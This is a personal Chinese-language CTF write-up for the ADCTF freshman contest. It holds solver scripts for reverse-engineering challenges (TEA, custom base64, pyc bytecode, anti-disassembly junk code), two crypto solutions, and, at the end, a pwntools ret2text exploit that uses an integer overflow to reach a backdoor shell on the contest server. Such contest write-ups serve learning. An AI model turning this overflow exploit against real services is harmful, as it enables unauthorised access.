---
title: "ADCTF"
description: "A&D新生赛的个人Writeup"
pubDate: "2025-01-01T13:49:19+08:00"
draft: false
---

 # ADCTF新生赛个人wp

## 		        Reverse

### 			   			      checkin

![image-20241201213852340](/images/adctf-writeup/001.png)

IDA打开可以看到逻辑很简单 直接给出exp

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char encoded[30] = { 0x55, 0x17, 0xC9, 0xBB, 0x4A, 0xA5, 0x86, 0xDF, 0x24, 0x0A, 
  0x1C, 0xA3, 0x27, 0xA1, 0x57, 0x35, 0xC3, 0xDB, 0x91, 0x88, 
  0x6D, 0x91, 0xA0, 0xCC, 0x71, 0x57, 0x71, 0xE4, 0x40 };
    char original_input[30];
    int i;

    srand(0x7E8u); 
    for (i = 0; i < 29; ++i) {
        original_input[i] = encoded[i] ^ rand();
    }
    original_input[29] = '\0'; 

    printf("%s\n",original_input);

    return 0;
}
//flag{y0u_Know_rAnd0m_4nd_xOr}
```

注意需要在linux环境下运行(**Windows和Linux下生成的随机数不同，附件为64位elf文件**)

### 			     			    ezPy

下载附件后发现是个pyinstaller打包的python文件(可以通过图标辨别)，用pyinstxtractor解包得到main.pyc文件，用在线网站对pyc文件反编译(用本地的pycdc也可以解决)

![image-20241201214834185](/images/adctf-writeup/002.png)

前面还有一段是密文数据，程序的逻辑就是每9个字节通过不同的表达式计算得到encoded数组，逆向思路只需要对这个方程组进行求解即可，采用z3约束求解器进行求解，exp如下

```python
from z3 import *

# Create a list of Z3 integer variables for the flag
flag = [Int(f"flag_{i}") for i in range(36)]

# Create a solver
solver = Solver()

# The secret values from the original problem
secret = [
    631, 1205, -500, 1021, 1879, 668, -281, 1651, 1326, 593, 428, -170, 515,
    1302, 452, 41, 814, 379, 382, 629, 650, 273, 1529, 630, 418, 1207, 1076,
    315, 1118, 469, 398, 1803, 647, 729, 1439, 1104
]

# Add constraints for each encoded value
for i in range(0, 36, 9):
    solver.add(3 * flag[i] + 7 * flag[i + 1] - 2 * flag[i + 2] + 5 * flag[i + 3] - 6 * flag[i + 4] - 14 == secret[i])
    solver.add(-5 * flag[i + 1] + 9 * flag[i + 2] + 4 * flag[i + 3] - 3 * flag[i + 4] + 7 * flag[i + 5] - 18 == secret[i + 1])
    solver.add(6 * flag[i] - 4 * flag[i + 1] + 2 * flag[i + 2] - 9 * flag[i + 5] + 5 * flag[i + 6] - 25 == secret[i + 2])
    solver.add(7 * flag[i + 1] + 3 * flag[i + 3] - 8 * flag[i + 4] + 6 * flag[i + 5] - 2 * flag[i + 6] + 4 * flag[i + 7] - 30 == secret[i + 3])
    solver.add(2 * flag[i] + 5 * flag[i + 2] - 4 * flag[i + 4] + 7 * flag[i + 5] + 9 * flag[i + 8] - 20 == secret[i + 4])
    solver.add(8 * flag[i] - 3 * flag[i + 1] + 5 * flag[i + 3] - 6 * flag[i + 7] + 2 * flag[i + 8] - 19 == secret[i + 5])
    solver.add(-7 * flag[i + 1] + 4 * flag[i + 2] - 5 * flag[i + 5] + 3 * flag[i + 6] + 6 * flag[i + 8] - 22 == secret[i + 6])
    solver.add(9 * flag[i] + 2 * flag[i + 2] + 6 * flag[i + 3] - 4 * flag[i + 6] + 5 * flag[i + 7] - 3 * flag[i + 8] - 27 == secret[i + 7])
    solver.add(4 * flag[i] - 5 * flag[i + 4] + 7 * flag[i + 5] + 3 * flag[i + 6] + 9 * flag[i + 7] - 2 * flag[i + 8] - 33 == secret[i + 8])

# Add constraints for flag ASCII values (valid ASCII range)
for f in flag:
    solver.add(0 <= f, f <= 255)

# Check if the solver finds a solution
if solver.check() == sat:
    model = solver.model()
    result = ''.join(chr(model[flag[i]].as_long()) for i in range(36))
    print("The flag is:", result)
else:
    print("No solution found")
#flag{y0U_4rE_r3@1ly_g0o0oOd_At_m4Th}
```

### 			    			    喝点茶吧

IDA打开之后，程序是加花过的，下面给出去花过程

![image-20241201215540491](/images/adctf-writeup/003.png)

这段汇编指令ebx先xor了自己，所以ZF标志位一定是0，程序正常的执行流程只会执行jz指令跳转到0x4012FA+1的位置，解决方法patch掉0x4012FA的字节再把剩下的字节转换成code即可(**C**)

![image-20241201215952410](/images/adctf-writeup/004.png)

第二处花指令和第一处类似，patch0x401328处的字节即可，包括loc_401320这一段数据也可以直接nop掉，因为程序只会执行jz这条指令的控制流，中间的都是不会执行的垃圾数据，去除完之后就可以在函数头按P定义这个函数，再F5反编译就可以看到main函数(已经过整理)

![image-20241201220538603](/images/adctf-writeup/005.png)

接着分析encrypt函数

![image-20241201220753115](/images/adctf-writeup/006.png)

发现并没有找到加密过程，查看这个函数的汇编可以发现这个函数也被加入了花指令

![image-20241201221107308](/images/adctf-writeup/007.png)

看到这个位置，先是call了一个附近的位置，然后retn，call指令会把call指令的下一条指令的地址入栈，retn则会把存入栈中的地址弹出到eip中，这一段操作没有改变程序原来的执行流程，但是会导致IDA识别出错导致栈失衡，解决方法就是从call指令到retn的下一个字节全部patch掉(0x401215 - 0x401251)，接着就能看到完整的逻辑了

![image-20241201221650758](/images/adctf-writeup/008.png)

__scrt_common_main_seh()就是具体的加密过程，然而这个函数也有花指令:(

![image-20241201222028668](/images/adctf-writeup/009.png)

这两个位置和前面提到的基本一样，不赘述

![image-20241201222327113](/images/adctf-writeup/010.png)

可以看到tea加密的特征，但是尝试解密得到的结果是错误的，这里有个MEMORY[0] = 0指令，这里要提到Windows系统下的异常处理机制**SEH**，简要来说就是通过某些逻辑错误导致系统发送错误信号，然后由SEH的过滤器来决定要不要接管这个错误，一旦系统开始接管这个错误，就会跳转到相应的处理函数，处理完成之后继续执行程序

更详细的可以看(https://bbs.kanxue.com/thread-249592.htm)

有了前面的知识之后，对程序动调，可以发现当ebp+var_1C地址处的值为0(**sum = 0**)时，程序在这个地方触发了一个异常(**非法访问内存地址**，对应的异常号为0xC0000005),这段指令的意思大概是访问了地址为0x0的内容

![image-20241201223820377](/images/adctf-writeup/011.png)

接着找到异常号对应的处理函数

![image-20241201223637373](/images/adctf-writeup/012.png)

阅读汇编之后其实就是调用了srand函数，seed为0x7E8

当sum！=0的时候，程序继续往下执行会看到这个地方出发了一个除数异常(**SIGILL**，异常号0xC000094)

![image-20241201224107100](/images/adctf-writeup/013.png)

这段汇编的意思就是一个数除以0，触发了这个异常，跳转到异常号对应的处理函数

![image-20241201224311813](/images/adctf-writeup/014.png)

这里就是调用了rand函数，再把sum+=rand()，处理完之后继续执行程序的sum -= delta指令，从这里开始，tea加密的每一轮加密都会调用一次这个rand函数，所以我们需要理一下加密的执行流程：第一轮加密(i=0)正常执行，中间会触发异常调用srand(0x7E8)，后面的31轮加密每次都会执行sum+=rand(),位置在sum-=delta之前，理清执行流程之后就可以写exp了,exp如下(记得在Windows下执行，因为附件是exe文件)

```c
#include <stdio.h>
#include <stdlib.h>
void tea_decrypt(unsigned int* a1, unsigned int* a2) {
    int i; // [esp+2Ch] [ebp-28h]
    unsigned int v3; // [esp+30h] [ebp-24h]
    unsigned int v4; // [esp+34h] [ebp-20h]
    unsigned int v5; // [esp+38h] [ebp-1Ch]

    v4 = *a1;
    v3 = a1[1];
    v5 = 0;
    v5 -= 0x61C88647;
    unsigned int seed = 0x7E8;
    srand(seed);
    int randoms[31];
    for (int i = 0; i < 31; i++) {
        randoms[i] = rand();  // 生成一个随机数
        v5 += randoms[i];
        v5 -= 0x61C88647;
    }

    for (i = 0; i < 32; ++i)
    {
        //v4 += (a2[v5 & 3] + v5) ^ (v3 + ((v3 >> 5) ^ (16 * v3)));
        //v5 -= 0x61C88647;
        v3 -= (a2[(v5 >> 11) & 3] + v5) ^ (v4 + ((v4 >> 5) ^ (16 * v4)));
        v5 += 0x61C88647;
        if (i != 31)
            v5 -= randoms[30 - i];
        v4 -= (a2[v5 & 3] + v5) ^ (v3 + ((v3 >> 5) ^ (16 * v3)));
    }
    *a1 = v4;
    a1[1] = v3;

}

int main() {
    // 加密的数据（假设为两个 32 位整数）

    unsigned int key[4] = { 0x114514, 0x1919810, 0x39C5BB, 0xFFE211 };  // 密钥
    unsigned int data[12] = { 0xC20B1189,0x275D3ADE, 0xB1ADFCDE, 0x8201166D, 0xCD1E08DC, 0xA0830899, 0xC7C8C706, 0x9FC9A9F5, 0x8250A71D, 0xED329E66, 0xB88D21D7, 0x2EDA3C43 };
    for (int i = 0; i < 12; i += 2) {
        unsigned int temp[2];
        temp[0] = data[i];
        temp[1] = data[i + 1];
        tea_decrypt(temp, key);
        printf("%x%x", temp[0], temp[1]);
    }
    return 0;
}
//flag{Y0u_s0lv3d_thE_Qu3s7I0n_5O_dr1nk_5oMe_t3A}
```

###                          			  Py_revenge

拿到附件之后IDA打开会看到很多的Py字样，再根据题目名字可以猜出是pyinstaller打包的程序，用pyinstxtractor解包得到pyc文件，用pycdc反编译的时候会发现只有部分逻辑

![image-20241202210755221](/images/adctf-writeup/015.png)

这种情况只能用pycdas看字节码

```bash
    [Disassembly]
        0       RESUME                          0
        2       LOAD_CONST                      0: 0
        4       LOAD_CONST                      1: None
        6       IMPORT_NAME                     0: base64
        8       STORE_NAME                      0: base64
        10      BUILD_LIST                      0
        12      LOAD_CONST                      2: (27, 40, 57, 63, 24, 4, 66, 4, 100, 122, 8, 27, 21, 122, 4, 15, 122, 20, 17, 98, 25, 115, 55, 82, 74, 71, 23, 20, 9, 26, 28, 105, 95, 34, 90, 46)
        14      LIST_EXTEND                     1
        16      STORE_NAME                      1: secret
        18      PUSH_NULL                       
        20      LOAD_NAME                       2: input
        22      LOAD_CONST                      3: 'Please enter the flag:'
        24      CALL                            1
        32      STORE_NAME                      3: flag
        34      PUSH_NULL                       
        36      LOAD_NAME                       0: base64
        38      LOAD_ATTR                       8: b64encode
        58      LOAD_NAME                       3: flag
        60      LOAD_ATTR                       11: encode
        80      CALL                            0
        88      CALL                            1
        96      LOAD_ATTR                       13: decode
        116     CALL                            0
        124     STORE_NAME                      3: flag
        126     LOAD_NAME                       3: flag
        128     GET_ITER                        
        130     LOAD_FAST_AND_CLEAR             0: c
        132     SWAP                            2
        134     BUILD_LIST                      0
        136     SWAP                            2
        138     FOR_ITER                        10 (to 160)
        142     STORE_FAST                      0: c
        144     PUSH_NULL                       
        146     LOAD_NAME                       7: ord
        148     LOAD_FAST                       0: c
        150     CALL                            1
        158     LIST_APPEND                     2
        160     JUMP_BACKWARD                   12 (to 138)
        162     END_FOR                         
        164     SWAP                            2
        166     STORE_FAST                      0: c
        168     STORE_NAME                      3: flag
        170     LOAD_CONST                      4: 'ADCTF2024'
        172     STORE_NAME                      8: key
        174     PUSH_NULL                       
        176     LOAD_NAME                       9: range
        178     PUSH_NULL                       
        180     LOAD_NAME                       10: len
        182     LOAD_NAME                       3: flag
        184     CALL                            1
        192     CALL                            1
        200     GET_ITER                        
        202     FOR_ITER                        46 (to 296)
        206     STORE_NAME                      11: i
        208     LOAD_NAME                       3: flag
        210     LOAD_NAME                       11: i
        212     COPY                            2
        214     COPY                            2
        216     BINARY_SUBSCR                   
        220     PUSH_NULL                       
        222     LOAD_NAME                       7: ord
        224     LOAD_NAME                       8: key
        226     LOAD_NAME                       11: i
        228     PUSH_NULL                       
        230     LOAD_NAME                       10: len
        232     LOAD_NAME                       8: key
        234     CALL                            1
        242     BINARY_OP                       6 (%)
        246     BINARY_SUBSCR                   
        250     CALL                            1
        258     BINARY_OP                       25 (^=)
        262     SWAP                            3
        264     SWAP                            2
        266     STORE_SUBSCR                    
        270     LOAD_NAME                       3: flag
        272     LOAD_NAME                       11: i
        274     COPY                            2
        276     COPY                            2
        278     BINARY_SUBSCR                   
        282     LOAD_NAME                       11: i
        284     BINARY_OP                       25 (^=)
        288     SWAP                            3
        290     SWAP                            2
        292     STORE_SUBSCR                    
        296     JUMP_BACKWARD                   48 (to 202)
        298     END_FOR                         
        300     LOAD_NAME                       3: flag
        302     LOAD_NAME                       1: secret
        304     COMPARE_OP                      40 (==)
        308     POP_JUMP_IF_FALSE               9 (to 328)
        310     PUSH_NULL                       
        312     LOAD_NAME                       12: print
        314     LOAD_CONST                      5: 'Correct!'
        316     CALL                            1
        324     POP_TOP                         
        326     RETURN_CONST                    1: None
        328     PUSH_NULL                       
        330     LOAD_NAME                       12: print
        332     LOAD_CONST                      6: 'Wrong!'
        334     CALL                            1
        342     POP_TOP                         
        344     RETURN_CONST                    1: None
        346     SWAP                            2
        348     POP_TOP                         
        350     SWAP                            2
        352     STORE_FAST                      0: c
        354     RERAISE                         0

```

经过分析可以知道程序的加密逻辑并不难，大概过程如下

```python
	for i in len(flag)
    	flag[i] = flag[i] ^ key[i % len(key)] ^ i
    #key = "ADCTF2024"
```

直接给出exp

```python
import base64

secret = [
    27, 40, 57, 63, 24, 4, 66, 4, 100, 122, 8, 27, 21, 122, 4, 15, 122, 20, 17, 98,
    25, 115, 55, 82, 74, 71, 23, 20, 9, 26, 28, 105, 95, 34, 90, 46
]
key = 'ADCTF2024'
decoded_flag = []
for i in range(len(secret)):
    decoded_flag.append(secret[i] ^ ord(key[i % len(key)]) ^ i)
decoded_flag_str = ''.join(chr(c) for c in decoded_flag)
original_flag = base64.b64decode(decoded_flag_str).decode()
print(original_flag)
#flag{u_aR3_4_Py7h0n_M@5t3r}
```

### 			  NotOnlyDotNet

拿到附件用IDA打开，进入main函数没有发现什么明显的加密逻辑，但是调用了ZSTD的api和一些进程之间的调用函数，并且通过ZSTD把两块内存中的数据解压出来了，猜测这两块内存是通过ZSTD压缩过后的数据，所以思路为dump出这两段数据再用ZSTD解压，看看程序的具体逻辑是什么

![image-20241202212137048](/images/adctf-writeup/016.png)

![image-20241202212158468](/images/adctf-writeup/017.png)

dump shell_data 和 core_data有两种方式，第一种是直接动调dump出解压后的数据，第二种方法是用IDApyhton脚本把这两段数据dump成bin文件，再用ZSTD库进行解压得到文件，这里采用第二种方式

```python
import idaapi
import idc
import ida_bytes


start_address = 0x402010  # 起始地址
size = 0x24AA  # 数据大小

output_file = "core_data.bin"

# 打开文件准备写入
with open(output_file, "wb") as f:
    for i in range(size):
        byte = ida_bytes.get_byte(start_address + i)
        f.write(bytes([byte]))

```

根据ida中给出的地址和大小就可以把这两个文件dump出来，然后用ZSTD解压

```bash
C:\Users\HelloCTF_OS\Downloads\NotOnlyDotNet (1)>zstd -d gshell_data.bin -o gshell_data_decompressed
gshell_data.bin     : 66818650 bytes

C:\Users\HelloCTF_OS\Downloads\NotOnlyDotNet (1)>zstd -d core_data.bin -o core_data_decompressed
core_data.bin       : 12288 bytes
```

![image-20241202212758914](/images/adctf-writeup/018.png)

得到这两个文件，对这两个程序查壳，发现是C#写的elf文件，用ILspy和dnspy进行反编译，ILspy和dnspy好像只能识别exe文件所以改了后缀

![image-20241202213208682](/images/adctf-writeup/009.png)

![image-20241202213259800](/images/adctf-writeup/019.png)

执行流程大概是：AES->XOR->Base64，其中AES和XOR用到的key是通过main函数传参过来的，所以key应该是在shell里面，随便翻翻就能找到，这里直接整合到一起了

![image-20241202213603804](/images/adctf-writeup/020.png)

exp如下(太懒了丢给ai了)

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

def xor_decrypt(data, xor_key):
    """XOR 解密"""
    return bytes([b ^ xor_key[i % len(xor_key)] for i, b in enumerate(data)])

def aes_decrypt(ciphertext, aes_key):
    """AES 解密"""
    cipher = AES.new(aes_key, AES.MODE_CBC, aes_key)  # 使用 aes_key 作为 IV
    decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted

def main(aes_key, xor_key, encrypted_data_base64):
    # Base64 解密
    encrypted_data = base64.b64decode(encrypted_data_base64)

    # 先进行 XOR 解密
    xor_decrypted = xor_decrypt(encrypted_data, xor_key)

    # 再进行 AES 解密
    aes_decrypted = aes_decrypt(xor_decrypted, aes_key)

    # 转换回 UTF-8 字符串
    decrypted_flag = aes_decrypted.decode('utf-8')
    return decrypted_flag

# 输入你的 aesKey 和 xorKey，以及已知的 Base64 加密后的数据
aes_key = bytes([62, 107, 51, 121, 49, 95, 102, 48, 114, 95, 122, 64, 107, 48, 60, 51])  # AES key
xor_key = b'z@k0f1ndth3key2w'  # XOR key（可以是任意字节数组）
encrypted_data_base64 = 'qpuQkUPI8knvxgK5U0UwKCrrQeOxdY8H6YKuzcD05OKatSh0UCg8+xDIxsbppDNaY3Eflx0Va8F/7wKxVrI8Qgq0vH4BUGXBDc1fSNUww5Y='  # 填入从C#程序中获取到的加密数据的Base64字符串

# 调用解密函数
decrypted_flag = main(aes_key, xor_key, encrypted_data_base64)
print(f"解密后的 flag: {decrypted_flag}")
# flag{U_r_r33lly_tAl3nted_At_r3ve3s3_aNA1yz1ng!!!_p@ch1!!!nyA!!!}
```

### 			   what!why!!!

DIE查壳，发现upx壳直接upx -d脱壳

![image-20241202214636135](/images/adctf-writeup/021.png)

![image-20241202233510014](/images/adctf-writeup/022.png)

main函数直接就是加密逻辑，大概就是64字节的数据，每四个为一组进行处理这里v6的值并没有显式给出来，但是看汇编能知道是s的首地址+64，就是s的最后一个字节的地址，尝试写了exp但是结果都不对，奇怪的是前4个字节是flag，但是后面的都不对，猜测程序在第一组字节加密过后对过程进行了修改

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
	unsigned char input[64] = { 
    0x87, 0xE9, 0x72, 0x0E, 0x1F, 0x57, 0xEC, 0x0C, 
    0xE9, 0x9C, 0xC0, 0x5E, 0x25, 0x32, 0xCD, 0x1F, 
    0xC0, 0x16, 0x31, 0x2B, 0xA5, 0xDC, 0x91, 0x71, 
    0xE0, 0x1F, 0xA3, 0x01, 0x6A, 0x1D, 0x6F, 0x55, 
    0x77, 0x1B, 0x0E, 0x33, 0xB7, 0xD0, 0xDE, 0x24, 
    0x3B, 0xCF, 0xAC, 0x64, 0xE3, 0x80, 0x7B, 0x3B, 
    0x62, 0xE4, 0x33, 0x1C, 0xCA, 0xBF, 0xAC, 0x5F, 
    0xF0, 0x9F, 0xB1, 0x0E, 0xCE, 0x40, 0xEE, 0x64
};
    unsigned int i, j;
    unsigned int rand_value;
	unsigned int seed = 0xD000721;
    srand(seed);
    for (i = 0; i < 16; i++) {
        rand_value = rand();
        for (j = 0; j < 4; j++) {
            input[4 * i + j] ^= rand_value;
			rand_value >>= 8;
        }
		
        seed = rand();
        srand(seed);
    }

    for (int i = 0; i < 64; i++) {
        printf("%x", input[i]);
    }
    return 0;
}
```

这是一开始写的exp，不对，重新对程序分析，在动调的时候发现程序调用sleep(60)的时候会一直处于sleep状态不跳出，应该是对sleep进行了修改，查看sleep的交叉引用

![image-20241202234351240](/images/adctf-writeup/023.png)

发现可疑函数

![image-20241202234612754](/images/adctf-writeup/024.png)

在最下面对sleep函数和srand函数都进行了操作，查看sub_4012C7函数

![image-20241202234705323](/images/adctf-writeup/025.png)

发现调用了两次mprotect函数修改了参数a1的内存读写权限，大概可以猜到就是这里对sleep和srand函数进行了修改，虽然知道了srand函数被修改了，但是不知道传进来的第二个的参数有什么用，然后在汇编里面乱翻翻到了一个未定义的函数(纯运qaq)

![image-20241202235714368](/images/adctf-writeup/026.png)

看汇编能看到熟悉的数字0x0D000721(seed)，可以根据汇编猜测就是当seed!=0x0D000721的时候会执行seed^=0x7A71571,所以main函数的加密过程是不完整的，经过修改的exp如下(请在linux环境下运行)

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
	unsigned char input[64] = { 
    0x87, 0xE9, 0x72, 0x0E, 0x1F, 0x57, 0xEC, 0x0C, 
    0xE9, 0x9C, 0xC0, 0x5E, 0x25, 0x32, 0xCD, 0x1F, 
    0xC0, 0x16, 0x31, 0x2B, 0xA5, 0xDC, 0x91, 0x71, 
    0xE0, 0x1F, 0xA3, 0x01, 0x6A, 0x1D, 0x6F, 0x55, 
    0x77, 0x1B, 0x0E, 0x33, 0xB7, 0xD0, 0xDE, 0x24, 
    0x3B, 0xCF, 0xAC, 0x64, 0xE3, 0x80, 0x7B, 0x3B, 
    0x62, 0xE4, 0x33, 0x1C, 0xCA, 0xBF, 0xAC, 0x5F, 
    0xF0, 0x9F, 0xB1, 0x0E, 0xCE, 0x40, 0xEE, 0x64
};
    unsigned int i, j;
    unsigned int rand_value;
	unsigned int seed = 0xD000721;
    srand(seed);
    for (i = 0; i < 16; i++) {
        rand_value = rand();
        for (j = 0; j < 4; j++) {
            input[4 * i + j] ^= rand_value;
			rand_value >>= 8;
        }
        seed = rand();
		if(seed != 0xD000721)
			seed ^= 0x7A71571;			//srand被修改之后的加密逻辑
        srand(seed);
    }

    for (int i = 0; i < 64; i++) {
        printf("%x", input[i]);
    }
    return 0;
}
//flag{kR@z1!!!y0U_3M1nent1y_g0o0od_aT_n0t_b3iNg_r1kr0lled_0rz!!!}
```

### 			  Do you like Kotone?

apk文件，jadx打开，找到mainactivity类

![image-20241203153602991](/images/adctf-writeup/013.png)

对用户输入判断的地方是调用了checker类的checkFlag方法，跟进去看看

![image-20241203153811875](/images/adctf-writeup/027.png)

可以看到在checkflag方法中调用了native层ezandroid.so文件的check方法，解压apk文件找到对应so文件打开

![image-20241203154309024](/images/adctf-writeup/028.png)

so层就是实现了一个标准的rc4加密，这里就不赘述，提取出密文即可，rc4的key在Java层传参的时候就已给出

流程就是base64->rc4，其中base64进行了换表操作，跟进table变量可以在string.xml文件中找到table的值

**89YdTR+PB67i0HaqGJWp4FtcL5Oufle/AVNDS3IxwzCn12mUskZjhrKoyvMXgEbQ**

![image-20241203154855526](/images/adctf-writeup/029.png)

尝试解密会失败，回到Java层的base64，根据函数名提示可能base64做了魔改，要重新看base64的逻辑，base64每次去三个字节的数据，最后会出现4个字节的密文，先取第一个字节的低6位并通过查表生成第一个字节的密文，接着取第第二个字节的低4位和一个字节的高2位拼在一起得到第二个字节密文，再取第二个字节高2位和第三个字节低4位组成第三个字节密文，再取第三个字节的低2位和第二个字节的高4位拼成第三个字节密文，最后取第三个字节的高6位组成第四个字节密文，如果明文的字节数不是3的倍数就缺几个字节填几个"="，解密就跟着这个过程逆着写就行

```python
data = "IktLx2oWUJP0aFKck0ocZF+G634e/24Go94OzrP8"   #最后一个字节是'='，改成table[0]这样不会影响解码过程
table = "89YdTR+PB67i0HaqGJWp4FtcL5Oufle/AVNDS3IxwzCn12mUskZjhrKoyvMXgEbQ"

table_dict = {char: idx for idx, char in enumerate(table)}

flag = ""

for i in range(0, len(data), 4):
    ch1 = table_dict[data[i]]
    ch2 = table_dict[data[i+1]]
    ch3 = table_dict[data[i+2]]
    ch4 = table_dict[data[i+3]]

    part1 = ch1 | ((ch2 & 3) << 6)
    part2 = ((ch2 & 0x3c) >> 2) | ((ch3 & 0xf) << 4)
    part3 = ((ch3 & 0x30) >> 4) | (ch4 << 2)
    
    flag += chr(part1)
    flag += chr(part2)
    flag += chr(part3)

print(flag)
#flag{Kot0Ne_1s_re@IIy_KAw@ii}
```

## 			Crypto

### 			Too_Close_To_Sqrt

我做出来的密码题都没什么好说的，网上找的脚本

```python
from Crypto.Util.number import *
import sympy

# n 和 c 的值
n = 77110253337392483710762885851693115398718726693715564954496625571775664359421696802771127484396119363821442323280817855193791448966346325672454247192244603281463595140923987182065095198239715749980911991399313395478292871386248479783966672279960117003211050451721307589036878362258617072298763845707881171743025954660306653186069633961424298647787491228085801739935823867940079473418881721402983930102278146132444200918211570297746753023639071980907968315022004518691979622641358951345391364430806558132988012728594904676117146959007388204192026655365596585273466096578234688721967922267682066710965927143418418189061
c = 702169486130185630321527556026041034472676838451810139529487621183247331904842057079283224928768517113408797087181581480998121028501323357655408002432408893862758626561073997320904805861882437888050151254177440453995235705432462544064680391673889537055043464482935772971360736797960328738609078425683870759310570638726605063168459207781397030244493359714270821300687562579988959673816634095712866030123140597773571541522765682883740928146364852979096568241392987132397744676804445290807040450917391600712817423804313823998912230965373385456071776639302417042258135008463458352605827748674554004125037538659993074220

# 使用 sympy 的 factorint() 来因式分解 n
factors = sympy.ntheory.factorint(n)

# 打印因数，查看哪些是 p 和 q
print(factors)

# 获取 p 和 q（在 RSA 中，n = p * q）
# 假设 n 只包含两个质因数 p 和 q
p = list(factors.keys())[0]
q = list(factors.keys())[1]

# 计算 φ(n)
phi_n = (p - 1) * (q - 1)

# 计算 d，d 是 e 的模 φ(n) 逆元
e = 65537
d = pow(e, -1, phi_n)

# 解密密文 c
m = pow(c, d, n)

# 将 m 转换为字节并显示
flag = long_to_bytes(m)
print(flag.decode())
#flag{oops_the_N_is_not_secure}

```

### 			   One_Key_Pad

逻辑就是flag^key，给出了密文，并且已知前5个字节为flag{ 直接爆破key即可

```python
# 爆破和解密脚本

# 已知的明文前五个字节：'flag{'
plaintext = [ord(c) for c in "flag{"]  # 转换为字节序列 [102, 108, 97, 103, 123]

# 密文的前五个字节
ciphertext = bytes.fromhex("e0eae7e1fde3e7fcffd9fee9f4fb")[:5]  # 提取密文前五个字节

# 步骤 1: 爆破密钥
key = []
for p, c in zip(plaintext, ciphertext):
    key.append(p ^ c)

# 打印出爆破得到的密钥
print(f"爆破出的key: {key}")

# 步骤 2: 解密整个密文
ciphertext_full = bytes.fromhex("e0eae7e1fde3e7fcffd9fee9f4fb")  # 完整密文

# 解密过程
plaintext_full = []
for i in range(len(ciphertext_full)):
    plaintext_full.append(ciphertext_full[i] ^ key[i % len(key)])

# 输出解密后的明文
try:
    print("解密后的明文:", bytes(plaintext_full).decode())
except UnicodeDecodeError:
    print("解密后的明文包含非打印字符，无法直接显示。")
    print("解密后的字节串:", bytes(plaintext_full))
#flag{eazy_xor}
```

## 			Pwn

### 			    ret2text

IDA打开附件

![image-20241203200056610](/images/adctf-writeup/030.png)

但是简单的栈溢出，程序会限制read函数读入的字节数小于96，但是nbytes由我们输入，所以只要输入-1造成整数溢出即可，后面就根据栈空间填payload到return的地址，然后换成后门的地址即可，exp如下

```python
from pwn import *
import time
context(log_level = 'debug')
host = '120.76.118.202'
port = 33001
io = remote(host, port)


io.recvuntil(b"Type your passphrase:")  
io.sendline(b"115c79a11142301a2c418f7c689f188e") 
#io.recvuntil(b"Anyway,how old are you now>")  
time.sleep(1)
io.sendline(b'-1') 
padding = 0x68 
return_addr = 0x400624  

payload = b'a' * padding + p64(return_addr)  
#io.recvuntil(b"So what are you going to say?\n")  
io.sendline(payload)

io.interactive()
#flag{668c6131-3680-438b-aacd-f76c5cede90e}
```

![image-20241203201023628](/images/adctf-writeup/031.png)

